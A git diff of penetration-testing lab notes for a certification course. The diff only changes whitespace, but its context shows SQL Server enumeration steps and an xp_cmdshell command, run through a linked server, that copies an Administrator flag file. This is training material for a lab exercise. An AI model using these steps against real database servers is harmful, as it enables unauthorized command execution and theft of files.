@@ -1,4 +1,5 @@
 https://github.com/missteek/cpts-quick-references/blob/main/assessments/Password%20Attacks%20Lab%20-%20Hard.md
+
 ---
 ### Attacking Common Services:
 ---
@@ -21,8 +22,6 @@ Login:          ssh simon@$ip
 
 #### Attacking Common Services - Hard:
 ```
-
-
 -- 1. Get the names of all databases in the SQL Server instance
 SELECT name FROM master.dbo.sysdatabases;
 GO
@@ -80,10 +79,8 @@ GO
 -- 13. Execute a command on the linked server using 'xp_cmdshell' to interact with the file system
 EXECUTE ('xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt > C:\Users\fiona\Desktop\xc.txt''') AT [LOCAL.TEST.LINKED.SRV];
 GO
-
-
 ```
----``
+---
 ### Attacking Web Applications with Ffuf:
 ---
 #### Skills Assessment - Web Fuzzing:
